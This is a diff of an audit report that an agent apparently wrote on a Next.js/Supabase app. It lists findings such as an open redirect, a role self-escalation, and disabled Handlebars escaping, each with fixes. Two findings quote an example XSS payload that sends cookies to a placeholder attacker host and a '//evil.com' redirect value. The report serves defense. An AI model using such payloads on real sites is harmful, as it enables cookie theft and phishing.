@@ -1,220 +1,136 @@
 # Layer Report: Security
 
 **Agent:** security
-**Completed:** 2026-03-20
+**Completed:** 2026-03-21
 **Severity legend:** CRITICAL / HIGH / MEDIUM / LOW / INFO
-
-**Disclaimer:** This is heuristic source-code analysis, not a penetration test or formal security audit. Dynamic vulnerabilities, infrastructure misconfigurations, and secrets in runtime environment are outside the scope of this report.
 
 ---
 
 ## Executive Summary
 
-Meridian has solid foundational security: Supabase Auth for passwordless authentication, HTTPS-enforced JWT sessions, Stripe and Resend webhook signature verification (svix), and row-level security (RLS) on all database tables. The primary security risks are architectural: missing centralized auth middleware (any new route handler can accidentally become public), lack of role-based authorization on ~95% of admin endpoints, hardcoded studio IDs that bypass multi-tenant isolation, and an Anthropic API key exposure risk if the AI endpoints are ever made public or if rate limiting is not added.
+**This report is the output of static heuristic analysis. It is not a penetration test or full security audit.** Recommended complementary tools: Semgrep, Snyk (`snyk test`), OWASP ZAP (dynamic scan), and `npm audit`.
+
+Meridian's API layer is architecturally sound: Supabase JWT authentication is enforced per-handler, a `middleware.ts` gate provides centralized redirect protection, Stripe and Resend webhook handlers implement proper HMAC signature verification, and a `requireRole()` helper exists and is used on the most sensitive endpoints (AI, campaigns, payroll, migration). The multi-tenancy model (RLS + explicit `studio_id` filtering) is structurally correct.
+
+However, three critical issues require immediate action before any production deployment: live Supabase service-role and Anthropic API keys are present in `.env.local` (requiring rotation); the OAuth callback accepts an unvalidated `redirect` parameter enabling open redirect attacks; and the `PUT /api/members/[id]` handler is missing a role check, allowing any authenticated user to add the `owner` role to their own profile.
+
+Beyond those, the audit found a cluster of HIGH-severity issues spanning missing security headers on all responses, HTML escaping disabled in the Handlebars email renderer, cryptographically weak code generators (gift cards, A/B test variants), and a rate limiter that resets on every serverless cold start.
 
 ---
 
-## Authentication Analysis
+## Authentication Architecture
 
-### Mechanism: Supabase Auth (Magic Link / SSO)
+**Method:** Supabase Auth (Magic Link / SSO), JWTs stored as HTTP-only session cookies via `@supabase/ssr`.
 
-- Passwordless — eliminates password-based attack vectors (credential stuffing, brute force)
-- Session stored in httpOnly cookies via `@supabase/ssr`
-- JWT validated server-side with `supabase.auth.getUser()` on every request
+**Enforcement:** `apps/web/src/middleware.ts` calls `supabase.auth.getUser()` on every request matching the route pattern and redirects unauthenticated users to `/login`. API routes unauthenticated receive a JSON 401. This is the primary protection layer.
 
-### Auth Enforcement Pattern
+**Per-handler checks:** All `~120` route handlers also call `supabase.auth.getUser()` as a second layer. The `requireRole()` helper at `apps/web/src/lib/auth/require-role.ts` combines auth + role check in a single reusable utility — adopted by AI endpoints and some others.
 
-```typescript
-const { data: { user }, error: authError } = await supabase.auth.getUser();
-if (authError || !user) {
-  return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
-}
-```
+**Role-based authorization:** Not consistent. Campaigns, AI, payroll, migration, QR, and members (GET/DELETE) check roles. Members (PUT), bookings, classes, segments, and geofence check only authentication.
 
-This pattern appears correctly in all reviewed route handlers. However, it is per-handler boilerplate with no centralized enforcement. A new handler that omits this check is instantly a public endpoint.
+**MFA:** Not available or required. Single-factor Magic Link only.
 
-**Missing:** No `middleware.ts` at the Next.js app root to gate all `/api/*` routes before they reach handlers.
-
-### Public Endpoints (No Auth Required)
-
-| Endpoint | Risk |
-|----------|------|
-| `POST /api/leads/capture` | No rate limit — spam/abuse risk |
-| `GET /api/openapi` | Exposes full API schema |
-| `GET /api/unsubscribe/[token]` | Token-based — acceptable |
-| `POST /api/webhooks/stripe` | Signature-verified — acceptable |
-| `POST /api/webhooks/resend` | Signature-verified — acceptable |
-| `POST /api/webhooks/twilio` | Unknown verification status |
-| `POST /api/webhooks/easypost` | Unknown verification status |
-
----
-
-## Authorization Analysis
-
-### Role-Based Access Control
-
-Only one endpoint performs role checking:
-- `GET/POST /api/campaigns` — checks `roles.includes('admin') || roles.includes('manager')`
-
-All other endpoints (~119 remaining) verify only authentication (user exists) not authorization (user has appropriate role to access the resource). Examples:
-- `GET /api/staff` — any authenticated member can list all staff
-- `GET /api/revenue` — any authenticated member can see revenue metrics
-- `GET /api/payroll/periods` — any authenticated member can view payroll data
-- `PATCH /api/members/[id]` — any authenticated member can modify any member's data
-- `DELETE /api/bookings/[id]` — any authenticated member can cancel any booking
-
-**Multi-role accounts:** The `profiles.roles` TEXT[] field supports `['admin', 'member']` and `['trainer', 'member']`. The authorization gap means member-role users who are legitimate app users have unrestricted access to all admin data.
-
----
-
-## Multi-Tenancy / RLS Analysis
-
-### RLS Policies
-
-All Phase 2 tables have RLS enabled with policies that use `current_setting('app.studio_id')::uuid`. This is a Supabase pattern where the server sets `app.studio_id` via a session variable before queries.
-
-**Concern:** The route handlers resolve `studio_id` from `profiles.studio_id` (correct for multi-tenancy) but approximately 15+ handlers fall back to a hardcoded UUID: `profile?.studio_id ?? '11111111-1111-1111-1111-111111111111'`. If a user's profile lookup fails (deleted profile, corrupted session), they silently get access to the development studio's data.
-
-**Inngest:** Uses a service-role client that bypasses RLS entirely. This is the documented intent (`must explicitly filter by studio_id`), but only the hardcoded STUDIO_ID is used. Cross-tenant data leakage in background jobs is possible once a second studio is onboarded.
-
-### Supabase RLS Configuration
-
-Per the Phase 2 migration SQL:
-```sql
-CREATE POLICY "campaigns_studio_isolation" ON campaigns
-  FOR ALL USING (studio_id = current_setting('app.studio_id')::uuid);
-```
-
-This RLS pattern requires the application to set `app.studio_id` via a Postgres session variable before every query. If the application does NOT set this variable, the `current_setting()` call will raise an error or return null, potentially causing all queries to fail (secure fail) or return empty results. Verification that the server client sets this session variable was not found in the reviewed code — the server client in `packages/supabase/src/server.ts` is a standard `createSSRClient` with no custom session variable injection.
-
-**This may mean RLS policies are not actually being applied** for Phase 2 tables, as the required `app.studio_id` session variable is never set.
-
----
-
-## Secret Management
-
-### Env Var Patterns
-
-All secrets are accessed via `process.env.*`. No secrets were found hardcoded in source code. The following sensitive env vars are referenced:
-
-| Variable | Sensitivity | Usage |
-|----------|------------|-------|
-| `ANTHROPIC_API_KEY` | HIGH | AI API calls |
-| `STRIPE_SECRET_KEY` | HIGH | Stripe server operations |
-| `STRIPE_WEBHOOK_SECRET` | HIGH | Webhook verification |
-| `SUPABASE_SERVICE_ROLE_KEY` | CRITICAL | Bypasses all RLS |
-| `RESEND_API_KEY` | HIGH | Email sending |
-| `RESEND_WEBHOOK_SECRET` | HIGH | Webhook verification |
-| `NEXT_PUBLIC_SUPABASE_URL` | LOW | Public endpoint |
-| `NEXT_PUBLIC_SUPABASE_PUBLISHABLE_DEFAULT_KEY` | LOW | Anon key |
-
-**Positive:** The `SUPABASE_SERVICE_ROLE_KEY` is only used in `lib/inngest/helpers.ts` (server-side, never client-side). The `NEXT_PUBLIC_*` vars are correctly limited to non-sensitive values.
-
-**Risk:** `.env.local` exists in `apps/web/` (confirmed by directory listing). If this file were accidentally committed, all secrets would be exposed. `.gitignore` presumably excludes it.
-
----
-
-## Input Validation
-
-### Observed Validation Patterns
-
-- `POST /api/classes` — validates `class_type_id`, `start_time`, `end_time`, `capacity` presence; validates `capacity > 0`; validates date parsing; validates `end > start`
-- `POST /api/members` — validates `email` and `full_name` presence; validates email regex
-- `POST /api/bookings` — validates `class_id` and `member_id` presence
-
-### Missing Validation
-
-- No Zod schema validation on any endpoint (Zod is a dependency but not used in route handlers)
-- No `Content-Type` validation on POST endpoints
-- No max body size enforcement
-- String injection: `search` parameter in `/api/members` is passed directly to `.ilike('%${search}%')` via Supabase PostgREST — Supabase parameterizes this, so SQL injection is not possible, but extremely long search strings could affect performance
-- `GET /api/migration/import` processes uploaded CSV data with a custom parser — CSV parsing logic is custom-written and only seen partially; injection risks in CSV data need verification
-
----
-
-## XSS / Content Security
-
-- `isomorphic-dompurify` is installed as a dependency — likely used for sanitizing user-generated HTML content (campaign email bodies, content posts)
-- `handlebars` is installed — used for email template rendering. Handlebars auto-escapes by default, but triple-braces `{{{unsafe}}}` would not escape. Usage not fully reviewed.
-- HTML email bodies stored in database as `body_html` TEXT — if rendered without sanitization in future member-facing surfaces, XSS risk
-
----
-
-## Webhook Security
-
-| Webhook | Signature Verification | Notes |
-|---------|----------------------|-------|
-| Stripe | `constructWebhookEvent()` — HMAC SHA-256 | Correct |
-| Resend | Svix `wh.verify()` — HMAC | Correct |
-| Twilio | Not reviewed | Risk if unverified |
-| EasyPost | Not reviewed | Risk if unverified |
-| Inngest | Inngest SDK handles | Correct |
-
----
-
-## Security Architecture Diagram
-
-```mermaid
-graph TD
-    subgraph PublicInternet["Public Internet"]
-        BROWSER[Browser / API Clients]
-        WEBHOOKS_EXTERNAL[External Webhooks\nStripe · Resend · Twilio · EasyPost]
-    end
-
-    subgraph NextJS["Next.js Server"]
-        MW["middleware.ts\nMISSING — no centralized auth gate"]
-        HANDLERS["Route Handlers\n~120 endpoints\nper-handler auth check"]
-        PUB_HANDLERS["Public Endpoints\nleads/capture · openapi · unsubscribe"]
-        WH_HANDLERS["Webhook Handlers\nsignature verification"]
-    end
-
-    subgraph Database["Database (Supabase)"]
-        RLS["RLS Policies\nstudio_id isolation\napp.studio_id session var required\n— NOT verified to be set"]
-        DB[(PostgreSQL)]
-    end
-
-    BROWSER --> MW
-    MW --> HANDLERS
-    MW --> PUB_HANDLERS
-    WEBHOOKS_EXTERNAL --> WH_HANDLERS
-    HANDLERS --> RLS
-    WH_HANDLERS --> DB
-    RLS --> DB
-```
+**Logout / revocation:** `supabase.auth.signOut()` is called from the client-side `AuthContext`. No server-side session invalidation mechanism was found.
 
 ---
 
 ## Findings
 
-**CRITICAL — RLS isolation policies may not be enforced:**
-Phase 2 RLS policies use `current_setting('app.studio_id')::uuid`. No code was found that sets this Postgres session variable before queries. If the variable is never set, the RLS policy comparison will either error or use a null value, potentially causing all RLS policies to fail-open (return nothing) or fail-closed (error). Either way, multi-tenant isolation may not be working as intended for Phase 2 tables.
+### CRITICAL
 
-**HIGH — No centralized auth middleware:**
-All 120+ route handlers individually perform auth checks. A new route handler that omits the boilerplate is immediately publicly accessible. Before Phase 5, `middleware.ts` must protect all `/api/*` routes except an explicit allowlist.
+**CRIT-01 — Live credentials in `.env.local`**
+`apps/web/.env.local` lines 1–6 contain live `SUPABASE_SERVICE_ROLE_KEY` (full RLS bypass), `ANTHROPIC_API_KEY`, and `NEXT_PUBLIC_SUPABASE_PUBLISHABLE_DEFAULT_KEY`. The service-role key can read/write every row in every table without RLS. Both the service-role key and Anthropic key must be rotated immediately. The `.gitignore` excludes `.env*`, so these are not in git history — but they exist on developer machines and could be leaked.
 
-**HIGH — Missing role authorization on ~95% of admin endpoints:**
-Any authenticated session — including a `member`-role account — can read revenue data, modify member records, access payroll data, and more. The role check in `campaigns/route.ts` is the sole example of role enforcement and should be a pattern applied uniformly.
+**CRIT-02 — Open redirect in OAuth callback**
+`apps/web/src/app/(auth)/auth/callback/route.ts` line 7: `const redirect = searchParams.get("redirect") || "/"` is used without validation at line 14: `return NextResponse.redirect(\`${origin}${redirect}\`)`. A crafted URL `?redirect=//evil.com/path` results in a redirect to `https://app.meridian.studio//evil.com/path` which browsers follow to `evil.com`. Fix: validate that `redirect` starts with `/` and does not start with `//`.
 
-**HIGH — Hardcoded studio UUID fallback in 15+ route handlers:**
-`profile?.studio_id ?? '11111111-1111-1111-1111-111111111111'` silently assigns an authenticated user to the development studio if their profile lookup fails. A malicious actor who can trigger a profile lookup failure (e.g., by deleting their own profile while holding a valid JWT) gains access to that studio's data.
+**CRIT-03 — `PUT /api/members/[id]` missing role check — privilege escalation**
+`apps/web/src/app/api/members/[id]/route.ts` lines 137–242: the `PUT` handler fetches the caller's profile to resolve `studio_id` but never checks `roles`. The `allowedFields` array at line 167 includes `"roles"`. Any authenticated user can `PUT /api/members/<their-own-id>` with `{"roles": ["owner"]}` to self-escalate. The `GET` and `DELETE` handlers on the same file do check roles (lines 38–43, 268–273). The `PUT` handler must add the same check.
 
-**MEDIUM — No rate limiting on public or AI endpoints:**
-`/api/leads/capture` (public) and all 13 AI endpoints have no rate limiting. The AI endpoints have real monetary cost (Anthropic API) and should have per-user, per-minute rate limits. The leads endpoint is spam-reachable without any defense.
+---
 
-**MEDIUM — DOMPurify dependency present but usage not verified:**
-`isomorphic-dompurify` is installed but its application in the email rendering pipeline and content post display was not confirmed. If HTML content from the database is rendered without DOMPurify sanitization in any user-facing context (particularly Phase 5 member portal), XSS risk exists.
+### HIGH
 
-**MEDIUM — Twilio and EasyPost webhook verification status unknown:**
-The Stripe and Resend webhooks correctly verify signatures. The Twilio and EasyPost webhook handlers were not fully reviewed. Unverified webhooks allow spoofed events to modify member or order data.
+**HIGH-01 — No security headers on any response**
+`apps/web/next.config.ts` does not configure HTTP security headers. All responses are missing `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Referrer-Policy`, and `Permissions-Policy`. Add a `headers()` export to `next.config.ts`.
 
-**LOW — `/api/openapi` publicly exposes full API schema:**
-The OpenAPI endpoint is unauthenticated. In a SaaS product, the internal API schema should either be gated or filtered before exposure.
+**HIGH-02 — Handlebars `noEscape: true` — XSS in email rendering**
+`apps/web/src/lib/email-templates.ts` line 56: `Handlebars.compile(templateStr, { noEscape: true })`. HTML escaping is disabled. Merge tag values from user-controlled fields (`full_name`, `membership_name`) are injected verbatim into email HTML. A member with name `<img src=x onerror=fetch('//attacker/'+document.cookie)>` would inject into campaign emails sent to all recipients. Remove `{ noEscape: true }`.
 
-**LOW — Handlebars triple-brace risk in email templates:**
-`handlebars` is installed for email template rendering. If any template uses `{{{unsafe_var}}}` (unescaped interpolation), user-supplied data could inject HTML into emails. Audit required.
+**HIGH-03 — Gift card codes use `Math.random()`**
+`apps/web/src/app/api/webhooks/stripe/route.ts` lines 204–212: `generateGiftCardCode()` uses `Math.floor(Math.random() * chars.length)`. `Math.random()` is a PRNG, not a CSPRNG. Gift card codes are bearer tokens; predictable codes allow brute-force redemption. Replace with `crypto.randomBytes()`.
 
-**INFO — Service role key is correctly server-only:**
-`SUPABASE_SERVICE_ROLE_KEY` is only referenced in `lib/inngest/helpers.ts`, a server-side module. It is never in `NEXT_PUBLIC_*` vars or client-side code. This is correct.
+**HIGH-04 — A/B test variant assignment uses `Math.random()`**
+`apps/web/src/app/api/campaigns/send/route.ts` line 248 and `campaigns/process-scheduled/route.ts` line 237. Non-CSPRNG for variant assignment. Replace with `crypto.randomInt(0, 100)`.
+
+**HIGH-05 — In-memory rate limiter ineffective in serverless**
+`apps/web/src/lib/rate-limit.ts`: rate limit state is stored in a module-level `Map`. On Netlify (serverless), each function invocation is a separate process. The 20 req/min AI rate limit and 10 req/min lead capture limit reset on every cold start. Replace with Upstash Redis or equivalent shared store.
+
+**HIGH-06 — Webhook endpoints fail open when secret not configured**
+`apps/web/src/app/api/webhooks/easypost/route.ts` lines 49–51 and `webhooks/twilio/route.ts` lines 13–46: if the respective secret environment variable is unset, the request is processed without signature verification. In production, a missing secret should cause a 503 error, not bypass verification.
+
+---
+
+### MEDIUM
+
+**MED-01 — Hardcoded studio UUID in 20+ files**
+The literal `"11111111-1111-1111-1111-111111111111"` appears in route handlers including webhook handlers (`webhooks/stripe/route.ts`), AI endpoints, and the `AuthContext`. Stripe webhook events write transactions with this hardcoded `studio_id` rather than resolving from event metadata. Multi-tenancy will silently break.
+
+**MED-02 — Unsubscribe token has no expiry; weak default secret**
+`apps/web/src/app/api/unsubscribe/[token]/route.ts` lines 5 and 34–46: the HMAC token includes a `timestamp` field but neither handler checks it against a maximum age. The fallback `UNSUBSCRIBE_SECRET = "meridian-unsubscribe-secret"` is a known plaintext that allows forging tokens if the environment variable is not set.
+
+**MED-03 — Cron GET endpoint mutates state**
+`apps/web/src/app/api/cron/waitlist-promote/route.ts` lines 10–12: the `GET` handler delegates to `POST`. A GET that creates bookings violates HTTP semantics and can be triggered by link prefetching or crawlers.
+
+**MED-04 — `NEXT_PUBLIC_` anon key in bundle — documentation gap**
+The Supabase anon key correctly uses the `NEXT_PUBLIC_` prefix (browser clients need it). The risk is convention propagation: a developer seeing this pattern may use `NEXT_PUBLIC_` for other secrets. This should be explicitly documented.
+
+**MED-05 — Migration `file_url` not validated for studio ownership**
+`apps/web/src/app/api/migration/import/route.ts` lines 100–149: `file_url` comes from the request body and the storage path is extracted by regex. An admin from one studio can provide the `file_url` of another studio's uploaded file. Validate that `storagePath.startsWith(`${studioId}/`)`.
+
+**MED-06 — Search parameter injected into Supabase PostgREST filter string**
+`apps/web/src/app/api/members/route.ts` lines 61–63 and `leads/route.ts` lines 80–83: `search` is string-interpolated into `.or()` filter expressions. PostgREST is not SQL, but malformed input can extend the filter clause. Sanitize `search` to remove PostgREST special characters before interpolation.
+
+**MED-07 — Inngest signing key not asserted at startup**
+`apps/web/src/app/api/inngest/route.ts`: `serve()` reads `INNGEST_SIGNING_KEY` from the environment but does not assert it is set. If missing, Inngest functions could be invoked with crafted event payloads from any source.
+
+---
+
+### LOW
+
+**LOW-01 — No Zod body validation on API endpoints**
+All `POST`/`PUT` handlers use manual field presence checks and type casts (`as { field: type }`). Zod is a declared dependency. Schema validation would prevent type confusion bugs and reduce the attack surface for malformed input.
+
+**LOW-02 — `select("*")` on list endpoints over-fetches PII**
+`/api/members` uses `select("*")` returning all profile columns. Explicit field selection reduces data exposure as the schema evolves.
+
+**LOW-03 — Gift card codes stored in plaintext**
+`gift_cards.code` is stored as plaintext. If the DB is compromised, all outstanding gift card balances are readable. Consider storing a hash.
+
+**LOW-04 — Lock file not confirmed committed**
+All `package.json` dependencies use caret ranges. Without a committed `package-lock.json` and `npm ci` in CI, builds are non-deterministic and can silently pull in vulnerable transitive dependencies.
+
+**LOW-05 — `roles` field writable via general member-update endpoint**
+Even after fixing CRIT-03 with a role check, `"roles"` should be removed from `allowedFields` in `PUT /api/members/[id]` and moved to a dedicated, owner-only endpoint with explicit audit logging.
+
+**LOW-06 — Hardcoded `unsubscribe_url` in email defaults**
+`apps/web/src/lib/email-templates.ts` line 35 hardcodes `https://thesaunaguys.com/unsubscribe` as the default unsubscribe URL. Emails using this default will not link to the HMAC-based unsubscribe endpoint.
+
+---
+
+### INFO
+
+**INFO-01 — Service-role client bypasses RLS (intended)**
+`apps/web/src/lib/inngest/helpers.ts`: the Inngest admin client using the service-role key is correct architecture for background jobs. All queries must filter by `studio_id` explicitly (the comment in the file notes this). Phase 5 RLS policy rewrite is required before client-side access is added.
+
+**INFO-02 — Admin layout has no server-side auth check**
+`apps/web/src/app/(admin)/layout.tsx` is `'use client'` and defers auth to `AuthContext`. Protection relies entirely on `middleware.ts`. A server-component layout calling `supabase.auth.getUser()` would provide defense-in-depth.
+
+**INFO-03 — Stripe proration not wired**
+`apps/web/src/app/api/members/[id]/upgrade/route.ts` lines 127–131: the actual `stripe.subscriptions.update()` call is not implemented. When wired, ensure idempotency between the upgrade endpoint and the `customer.subscription.updated` webhook.
+
+**INFO-04 — `NEXT_PUBLIC_APP_URL` falls back to production domain**
+`apps/web/src/app/api/qr/member/[id]/route.ts` line 87: `process.env.NEXT_PUBLIC_APP_URL ?? "https://app.meridian.studio"`. In development/staging, generated QR codes point to production.
 
 ---
 
@@ -222,8 +138,8 @@ The OpenAPI endpoint is unauthenticated. In a SaaS product, the internal API sch
 
 | Severity | Count | Items |
 |----------|-------|-------|
-| CRITICAL | 1 | RLS policies may not be enforced (app.studio_id never set) |
-| HIGH | 3 | No auth middleware, missing role authorization, hardcoded UUID fallback |
-| MEDIUM | 3 | No rate limiting, DOMPurify usage unverified, Twilio/EasyPost webhook verification unknown |
-| LOW | 2 | OpenAPI public, Handlebars XSS risk |
-| INFO | 1 | Service role key correctly server-side |
+| CRITICAL | 3 | Live credentials in `.env.local`, open redirect in auth callback, missing role check + privilege escalation on `PUT /members/:id` |
+| HIGH | 6 | Missing security headers, Handlebars `noEscape`, non-CSPRNG code generation (x2), in-memory rate limiter, webhook fail-open |
+| MEDIUM | 7 | Hardcoded studio UUID, unsubscribe token no expiry, cron GET mutation, NEXT_PUBLIC doc gap, migration file_url ownership, search injection, Inngest signing key |
+| LOW | 6 | No Zod validation, select star, plaintext gift codes, lock file, roles in allowedFields, hardcoded unsubscribe URL |
+| INFO | 4 | Service-role intent, admin layout auth, Stripe proration stub, APP_URL fallback |
